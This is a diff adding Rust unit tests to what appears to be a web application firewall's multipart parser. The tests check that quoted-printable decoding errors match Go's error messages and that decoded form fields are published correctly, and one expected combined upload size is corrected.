+        assert_eq!(std::fs::read(as_sent).unwrap(), b"x=3Dy");
+    }
+
+    #[test]
+    fn a_quoted_printable_body_go_cannot_read_is_an_error_with_go_s_message() {
+        // Go's processor returns the reader's error from the copy, so it reaches `REQBODY_PROCESSOR_ERROR_MSG` as
+        // it is, with `MULTIPART_STRICT_ERROR`. The part is published up to the byte that failed, then as sent.
+        // Go reads no further part; here the parts after it are read, as a backend that does not stop there would.
+        let long = "a".repeat(4097);
+        let cases: [FailureCase<'_>; 6] = [
+            ("a lone =", b"=", "quotedprintable: invalid bytes after =: \"\"", b""),
+            (
+                "= before a bare CR",
+                b"a=\rb",
+                "quotedprintable: invalid hex byte 0x0d",
+                b"a",
+            ),
+            (
+                "a control byte",
+                b"ok=3Dpart\x01bad",
+                "quotedprintable: invalid unescaped byte 0x01 in body",
+                b"ok=part",
+            ),
+            (
+                "DEL",
+                b"a\x7fb",
+                "quotedprintable: invalid unescaped byte 0x7f in body",
+                b"a",
+            ),
+            (
+                "a soft break before a bare CR",
+                b"a=\r \nb",
+                "quotedprintable: invalid bytes after =: \"\\r \\n\"",
+                b"a",
+            ),
+            (
+                "a line longer than the 4096 bytes Go reads at once",
+                long.as_bytes(),
+                "bufio: buffer full",
+                long.as_bytes().get(..4096).unwrap(),
+            ),
+        ];
+        for (what, encoded, message, published) in cases {
+            let mut body = part_body(r#"name="f""#, &[QP], encoded);
+            body.splice(
+                0..0,
+                b"--b\r\nContent-Disposition: form-data; name=\"before\"\r\n\r\nok\r\n"
+                    .iter()
+                    .copied(),
+            );
+            body.truncate(body.len() - CLOSE.len());
+            body.extend_from_slice(b"--b\r\nContent-Disposition: form-data; name=\"after\"\r\n\r\nlater\r\n--b--\r\n");
+            let tx = process_with_rules(&body, "SecRequestBodyAccess On");
+            assert_eq!(tx.reqbody_error.get(), "1", "{what}");
+            assert_eq!(tx.reqbody_processor_error_msg.get(), message, "{what}");
+            assert_eq!(tx.multipart_strict_error.get(), "1", "{what}");
+            assert_eq!(tx.args_post.first(b"before"), Some(&b"ok"[..]), "{what}");
+            assert_eq!(
+                values(&tx.args_post, "f"),
+                decoded_and_sent(published, encoded),
+                "{what}: published as far as it was decoded, then as sent"
+            );
+            assert_eq!(values(&tx.args_post, "after"), [b"later".to_vec()], "{what}");
+        }
+    }
+
+    #[test]
+    fn the_first_quoted_printable_error_is_the_one_reported() {
+        // Go stops at the first part it cannot decode, so its message is the one that reaches the rules even when
+        // another part after it fails too.
+        let mut body = part_body(r#"name="one""#, &[QP], b"a\x01b");
+        body.truncate(body.len() - CLOSE.len());
+        body.extend_from_slice(&part_body(r#"name="two""#, &[QP], b"c=\rd"));
+        let tx = process(&body);
+        assert_eq!(tx.reqbody_error.get(), "1");
+        assert_eq!(
+            tx.reqbody_processor_error_msg.get(),
+            "quotedprintable: invalid unescaped byte 0x01 in body"
+        );
+        assert_eq!(values(&tx.args_post, "two"), decoded_and_sent(b"c", b"c=\rd"));
+    }
+
     #[test]
     fn a_folded_filename_line_publishes_the_file_and_is_detected() {
         // Go's `textproto` folds the leading-space line into the Content-Disposition
@@ -2776,7 +3381,8 @@ post-attack\r\n\
         );
         assert_eq!(tx.files_sizes.value_count(), 2);
         assert_eq!(tx.files_names.value_count(), 2);
-        assert_eq!(tx.files_combined_size.get(), "12");
+        // Both files (7 and 5 bytes) and both fields (10 and 11 bytes), as Go's total.
+        assert_eq!(tx.files_combined_size.get(), "33");
         assert_eq!(tx.files_tmp_names.value_count(), 0);
         assert!(tx.uploaded_paths.is_empty());
         assert_eq!(
